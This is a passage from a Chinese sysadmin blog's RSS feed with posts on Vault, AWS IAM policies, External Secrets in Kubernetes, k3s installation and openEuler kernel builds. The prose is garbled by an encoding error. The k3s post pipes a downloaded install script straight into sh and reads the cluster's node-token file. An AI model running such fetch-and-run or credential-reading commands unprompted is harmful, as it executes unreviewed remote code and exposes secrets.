&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Federator çš„policyï¼Œç”¨äºè·å¾—token&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;Version&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;2012-10-17&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;Statement&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;s2&#34;&gt;&amp;#34;Sid&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;VisualEditor0&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;s2&#34;&gt;&amp;#34;Effect&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;Allow&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;s2&#34;&gt;&amp;#34;Action&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;sts:GetFederationToken&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;s2&#34;&gt;&amp;#34;Resource&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;*&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Change-self-access-keys çš„policyï¼Œç”¨äºè½®è½¬key&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;Version&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;2012-10-17&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;Statement&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;s2&#34;&gt;&amp;#34;Effect&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;Allow&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;s2&#34;&gt;&amp;#34;Action&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;s2&#34;&gt;&amp;#34;iam:ListUsers&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;s2&#34;&gt;&amp;#34;iam:GetAccountPasswordPolicy&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;s2&#34;&gt;&amp;#34;Resource&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;*&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;s2&#34;&gt;&amp;#34;Effect&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;Allow&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;s2&#34;&gt;&amp;#34;Action&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;s2&#34;&gt;&amp;#34;iam:*AccessKey*&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;s2&#34;&gt;&amp;#34;iam:GetUser&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;s2&#34;&gt;&amp;#34;Resource&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;s2&#34;&gt;&amp;#34;arn:aws:iam::*:user/&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;aws&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶ååœ¨Vaultä¸­è®¾ç½®ä½¿ç”¨AWS secrets&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vault secrets &lt;span class=&#34;nb&#34;&gt;enable&lt;/span&gt; aws
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# awsä¸­éœ€è¦å¯¹åº”IAMçš„æƒé™&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# è¦ä¹ˆæ˜¯çœŸæœ‰aws iamçš„ç”¨æˆ·ï¼›è¦ä¹ˆæ˜¯æœ‰ä¸€ä¸ªroleï¼Œå’Œå¯¹åº”çš„ä¸´æ—¶ç”¨æˆ·ï¼›äºŒé€‰ä¸€&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vault write aws/config/root &lt;span class=&#34;nv&#34;&gt;access_key&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;YYY &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nv&#34;&gt;secret_key&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;XXX &lt;span class=&#34;nv&#34;&gt;region&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;us-east-1 &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;nv&#34;&gt;sts_endpoint&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;https://sts.us-east-1.amazonaws.com &lt;span class=&#34;nv&#34;&gt;sts_region&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;us-east-1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# è½®è½¬rootå‡­æ®ï¼Œè¿™æ ·rootå‡­æ®å°±åªå­˜åœ¨äºvaultä¸­äº†&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vault write -force aws/config/rotate-root
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä½¿ç”¨æ–¹æ³•ï¼š&lt;/p&gt;</description>
    </item>
    <item>
      <title>vaultä½¿ç”¨external secretç®¡ç†kubernetes secret</title>
      <link>https://rendoumi.com/posts/20250815-vault_k8s/</link>
      <pubDate>Fri, 15 Aug 2025 09:01:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20250815-vault_k8s/</guid>
      <description>&lt;h3 id=&#34;ä»Šå¤©æ˜¯2025å¹´8æœˆ15æ—¥å¤§å™©è€—å•Š&#34;&gt;ä»Šå¤©æ˜¯2025å¹´8æœˆ15æ—¥ï¼Œå¤§å™©è€—å•Šï¼š&lt;/h3&gt;
&lt;h2 id=&#34;external-secrets--external-secrets&#34;&gt;external-secrets / external-secrets&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/external-secrets/external-secrets&#34;&gt;Link&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;â­ 5416 | ğŸ”€ 1032 | Go 97.6%&lt;/p&gt;
&lt;h3 id=&#34;external-secrets-operator-é¡¹ç›®æš‚åœå‘å¸ƒ&#34;&gt;External Secrets Operator é¡¹ç›®æš‚åœå‘å¸ƒ&lt;/h3&gt;
&lt;p&gt;ç”±äºç»´æŠ¤å›¢é˜Ÿè§„æ¨¡è¿‡å°ï¼ŒExternal Secrets Operator å†³å®šæš‚åœæ‰€æœ‰å®˜æ–¹ç‰ˆæœ¬å‘å¸ƒï¼Œç›´åˆ°é‡å»ºè¶³å¤Ÿçš„ç»´æŠ¤å›¢é˜Ÿã€‚&lt;/p&gt;
&lt;h4 id=&#34;key-takeaways&#34;&gt;Key Takeaways&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;é¡¹ç›®æš‚åœæ‰€æœ‰å®˜æ–¹ç‰ˆæœ¬å‘å¸ƒï¼ŒåŒ…æ‹¬æ–°åŠŸèƒ½ã€è¡¥ä¸å’Œå®¹å™¨é•œåƒã€‚&lt;/li&gt;
&lt;li&gt;å°†ç»§ç»­å®¡æ ¸å’Œåˆå¹¶ç¤¾åŒºçš„ PRï¼Œä½†ä¸ä¼šæä¾› GitHub Discussionsã€Slack æˆ–é—®é¢˜è¯„è®ºçš„æ”¯æŒã€‚&lt;/li&gt;
&lt;li&gt;éœ€è¦è‡³å°‘äº”åé•¿æœŸç»´æŠ¤è€…æ¥ç¡®ä¿é¡¹ç›®çš„å¯æŒç»­å‘å±•ã€‚&lt;/li&gt;
&lt;li&gt;é¼“åŠ±ä¾èµ–è¯¥é¡¹ç›®çš„å…¬å¸æˆ–å›¢é˜Ÿç§¯æå‚ä¸è´¡çŒ®ã€‚&lt;/li&gt;
&lt;li&gt;è´¡çŒ®è€…å¯é€šè¿‡å¡«å†™è¡¨å•æˆ–æŸ¥çœ‹æ²»ç†æ–‡æ¡£åŠ å…¥é¡¹ç›®ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å±…ç„¶æš‚åœå‘å¸ƒäº†ï¼Œé‚£å°±æŠ“ç´§æ—¶é—´æŠŠVaultè·Ÿå®ƒçš„é›†æˆè®°å½•ä¸‹æ¥ï¼š&lt;/p&gt;
&lt;h3 id=&#34;ä¸€é¦–å…ˆå¿…é¡»åœ¨é›†ç¾¤é‡Œå®‰è£…vaultç„¶åå®‰è£…external--secretséƒ½ç”¨helmè£…å³å¯&#34;&gt;ä¸€ã€é¦–å…ˆå¿…é¡»åœ¨é›†ç¾¤é‡Œå®‰è£…Vaultï¼Œç„¶åå®‰è£…external -secretsï¼Œéƒ½ç”¨helmè£…å³å¯&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;helm repo add hashicorp https://helm.releases.hashicorp.com
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;helm repo update
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;helm install vault hashicorp/vault --set &lt;span class=&#34;s2&#34;&gt;&amp;#34;server.dev.enabled=true&amp;#34;&lt;/span&gt; --set &lt;span class=&#34;s2&#34;&gt;&amp;#34;injector.enabled=true&amp;#34;&lt;/span&gt; --namespace default
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;helm repo add external-secrets https://charts.external-secrets.io
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;helm repo update
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;helm install external-secrets external-secrets/external-secrets --namespace external-secrets --create-namespace --set &lt;span class=&#34;nv&#34;&gt;installCRDs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;äºŒk8sæˆæƒk8çš„æˆæƒä½“ç³»å°±æ˜¯-sa---role---rolebinding&#34;&gt;äºŒã€k8sæˆæƒï¼Œk8çš„æˆæƒä½“ç³»å°±æ˜¯ sa -&amp;gt; role -&amp;gt; rolebinding&lt;/h3&gt;
&lt;p&gt;é‚£kubernetesä¼šæŠŠpodä¸­saçš„Tokenæ³¨å…¥åˆ°æ–‡ä»¶ï¼š&lt;code&gt;/var/run/secrets/kubernetes.io/serviceaccount/token&lt;/code&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>k3sçš„å®‰è£…</title>
      <link>https://rendoumi.com/posts/20250808-k3s_install/</link>
      <pubDate>Fri, 08 Aug 2025 09:11:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20250808-k3s_install/</guid>
      <description>&lt;p&gt;è¿™ç¯‡æ˜¯ä¸€ä¸ªå¤§æ°´è´´ï¼Œåªæ˜¯ä¸ºäº†è®°å½•k3sçš„å®‰è£…&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªä¸œè¥¿è¢«Rancherç”¨å¾—çº¯ç†Ÿï¼Œå…ˆæ­å»ºä¸€ä¸ªk3sé›†ç¾¤ï¼Œç„¶åå†å…¶ä¸Šè£…æ§åˆ¶è½¯ä»¶ï¼Œå†å»æ§åˆ¶å…¶å®ƒé›†ç¾¤ï¼Œéå¸¸å¥½çš„æƒ³æ³•ï¼Œå€¼å¾—å€Ÿé‰´&lt;/p&gt;
&lt;p&gt;å®‰è£…å’Œåˆ é™¤éƒ½éå¸¸ç®€æ´ï¼Œå‡†å¤‡å·¥ä½œï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apt update &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; apt upgrade -y
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# ä¸‰å°æœºå™¨åˆ†åˆ«è®¾ç½®&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hostnamectl set-hostname master
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hostnamectl set-hostname worker-1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hostnamectl set-hostname worker-2
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# vi /etc/hosts&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;127.0.0.1 master
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# ä¸¤å¤–ä¸¤å°ä¹Ÿåˆ†åˆ«è®¾ç½®&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;127.0.0.1 worker-1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# ç¬¬3å°&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;127.0.0.1 worker-2
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å‡†å¤‡å·¥ä½œéƒ½å¼„å¥½äº†ã€‚ä¸‹é¢å®‰è£…&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl -sfL https://get.k3s.io &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; sh -
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;systemctl status k3s
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat /var/lib/rancher/k3s/server/node-token
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# åŠ å…¥æ–°èŠ‚ç‚¹&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl -sfL https://get.k3s.io &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;K3S_URL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;https://192.168.0.200:6443 &lt;span class=&#34;nv&#34;&gt;K3S_TOKEN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;lt;your-token-here&amp;gt; &lt;span class=&#34;nv&#34;&gt;INSTALL_K3S_EXEC&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;--node-ip=&amp;lt;worker-ip&amp;gt;&amp;#34;&lt;/span&gt; sh -
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åˆ é™¤ä¹Ÿå°±ä¸€å¥&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/usr/local/bin/k3s-uninstall.sh
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¯ä»¥åå¤è¿›è¡Œå®‰è£…&lt;/p&gt;</description>
    </item>
    <item>
      <title>æ¬§æ‹‰PageCacheçš„å†…æ ¸ç¼–è¯‘</title>
      <link>https://rendoumi.com/posts/20250808-openeuler_pagecache/</link>
      <pubDate>Fri, 08 Aug 2025 09:01:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20250808-openeuler_pagecache/</guid>
      <description>&lt;h1 id=&#34;æ¬§æ‹‰-page-cache-çš„å†…æ ¸ç¼–è¯‘&#34;&gt;æ¬§æ‹‰ Page Cache çš„å†…æ ¸ç¼–è¯‘&lt;/h1&gt;
&lt;p&gt;PageCacheæä¾›äº†ä¸€ç§é™åˆ¶page cacheçš„èƒ½åŠ›ï¼Œèƒ½å¤Ÿå¯¹page cacheçš„æ€»é‡è¿›è¡Œæ§åˆ¶, å¢å¼ºç³»ç»Ÿåœ¨æ•°æ®åº“ç­‰page cacheå æ¯”è¾ƒé«˜åœºæ™¯ä¸‹çš„ç¨³å®šæ€§ï¼Œç§¯æé‡Šæ”¾ç¼“å­˜ã€‚&lt;/p&gt;
&lt;p&gt;å®ƒæä¾›äº†ä»¥ä¸‹sysctlæ¥å£ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;vm.pagecache_limit_ratioï¼špagecacheå ç³»ç»Ÿæ€»å†…å­˜çš„ç™¾åˆ†æ¯”ï¼Œ[0, 100]ï¼Œ0å’Œ100éƒ½è¡¨ç¤ºåŠŸèƒ½å…³é—­ã€‚&lt;/li&gt;
&lt;li&gt;vm.pagecache_limit_reclaim_ratioï¼šé’ˆå¯¹pagecacheçœŸå®å›æ”¶çš„æ¯”ä¾‹ï¼Œåœ¨å®é™…å›æ”¶æ—¶ï¼Œæ€»æ˜¯æ¯”pagecache_limit_ratioçš„å¤šå›æ”¶ä¸€äº›ï¼Œé»˜è®¤æ¯”ä¾‹æ˜¯2%ã€‚&lt;/li&gt;
&lt;li&gt;vm.pagecache_limit_ignore_dirtyï¼šåœ¨å›æ”¶æ—¶æ˜¯å¦å¿½ç•¥è„é¡µï¼Œé»˜è®¤å¿½ç•¥ã€‚å› ä¸ºå¯¹è„é¡µçš„å›æ”¶è¾ƒè€—æ—¶ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;è¡¥ä¸æ˜¯åŸºäº openEuler-22.03-LTS çš„ï¼Œä¸é€‚ç”¨äº 24.03-LTSï¼Œä»£ç éƒ½å·²ä¸åŒäº†&lt;/p&gt;
&lt;p&gt;ç¼–è¯‘è¿‡ç¨‹å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;ä¸€ã€å®‰è£…å¥½openEuler-22.03-LTSï¼Œç£ç›˜ç•™å¤Ÿç©ºé—´ï¼Œæœ€å°‘ç•™20G&lt;/p&gt;
&lt;p&gt;äºŒã€å®‰è£…ç¼–è¯‘å·²ç»æ‰€éœ€è½¯ä»¶&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dnf install -y rpm-build openssl-devel bc rsync gcc gcc-c++ flex bison m4 elfutils-libelf-devel
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dnf install -y python
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dnf install -y ncurses-devel
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dnf install -y dwarves
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¸‰ã€å®‰è£…å†…æ ¸æºä»£ç &lt;/p&gt;
